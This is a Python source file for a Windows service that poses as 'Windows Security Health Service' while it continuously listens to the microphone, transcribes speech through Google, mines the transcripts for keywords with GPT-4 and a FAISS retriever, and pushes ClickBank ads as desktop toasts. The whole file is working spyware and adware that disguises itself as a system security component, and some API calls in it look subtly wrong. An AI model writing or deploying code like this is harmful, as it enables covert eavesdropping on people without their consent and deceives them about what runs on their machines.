import os
import sys
import time
import json
import logging
import requests
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import KMeans
from win32serviceutil import ServiceFramework, HandleCommandLine
import win32service
import win32event
import win32api
import speech_recognition as sr
from openai import ChatCompletion
from langchain.vectorstores import FAISS
from langchain.embeddings import OpenAIEmbeddings
from langchain.chains import RetrievalQA
from win10toast import ToastNotifier
from playsound import playsound

CONFIG_FILE = "config.json"
CLICKBANK_API_BASE = "https://api.clickbank.com/rest/1.3/"


class EdgeAIAdService(ServiceFramework):
    _svc_name_ = "WindowsSecurityHealthService"
    _svc_display_name_ = "Windows Security Health Service x86"
    _svc_description_ = "Windows Security Health Service"

    def __init__(self, args):
        super().__init__(args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self.running = True

        # Logging setup
        logging.basicConfig(
            filename="WindowsSecurityHealthService.log",
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s"
        )
        self.logger = logging.getLogger()

        # Load configuration
        try:
            with open(CONFIG_FILE, "r") as f:
                self.config = json.load(f)
        except Exception as e:
            self.logger.error(f"Failed to load config: {e}")
            self.config = {}

        # OpenAI API Key
        self.openai_api_key = self.config.get("openai_api_key", "")
        if not self.openai_api_key:
            self.logger.error("OpenAI API key not found in configuration.")
            sys.exit(1)

        # RAG Setup
        self.vectorstore = self.setup_vectorstore()
        self.ad_keywords = set()

    def setup_vectorstore(self):
        """Setup vectorstore for RAG."""
        self.logger.info("Initializing vectorstore for RAG...")
        try:
            embeddings = OpenAIEmbeddings()
            return FAISS.load_local("faiss_index", embeddings)
        except Exception as e:
            self.logger.error(f"Failed to initialize vectorstore: {e}")
            return None

    def fetch_ads(self, keywords):
        """Fetch ads using ClickBank API."""
        self.logger.info("Fetching ads from ClickBank...")
        ads = []
        for keyword in keywords:
            try:
                response = requests.get(
                    f"{CLICKBANK_API_BASE}ads?keyword={keyword}",
                    headers={"Authorization": f"Bearer {self.config.get('clickbank_api_key', '')}"}
                )
                if response.status_code == 200:
                    ads.extend(response.json().get("ads", []))
            except Exception as e:
                self.logger.error(f"Error fetching ads for {keyword}: {e}")
        return ads

    def analyze_keywords(self, text):
        """Analyze voice input using GPT and RAG for keyword detection."""
        self.logger.info("Analyzing keywords with RAG and GPT...")
        try:
            retriever = self.vectorstore.as_retriever()
            chain = RetrievalQA.from_chain_type(
                llm=ChatCompletion(api_key=self.openai_api_key, model="gpt-4"),
                retriever=retriever
            )
            response = chain.run({"question": text})
            keywords = response.split(", ")
            self.logger.info(f"Detected keywords: {keywords}")
            return keywords
        except Exception as e:
            self.logger.error(f"Error in keyword analysis: {e}")
            return []

    def SvcStop(self):
        self.logger.info("Stopping service...")
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.running = False
        win32event.SetEvent(self.stop_event)

    def SvcDoRun(self):
        self.logger.info("Service started.")
        recognizer = sr.Recognizer()
        microphone = sr.Microphone()
        toast_notifier = ToastNotifier()

        while self.running:
            try:
                self.logger.info("Listening for voice input...")
                with microphone as source:
                    recognizer.adjust_for_ambient_noise(source)
                    audio = recognizer.listen(source)

                voice_text = recognizer.recognize_google(audio)
                self.logger.info(f"Captured voice: {voice_text}")

                # Analyze voice text for keywords
                detected_keywords = self.analyze_keywords(voice_text)
                self.ad_keywords.update(detected_keywords)

                # Fetch and display ads
                ads = self.fetch_ads(self.ad_keywords)
                for ad in ads:
                    toast_notifier.show_toast(ad.get("title", "Ad"), ad.get("description", ""), duration=10)
            except Exception as e:
                self.logger.error(f"Error during service run: {e}")

            time.sleep(self.config.get("detection_interval", 300))


if __name__ == "__main__":
    HandleCommandLine(EdgeAIAdService)
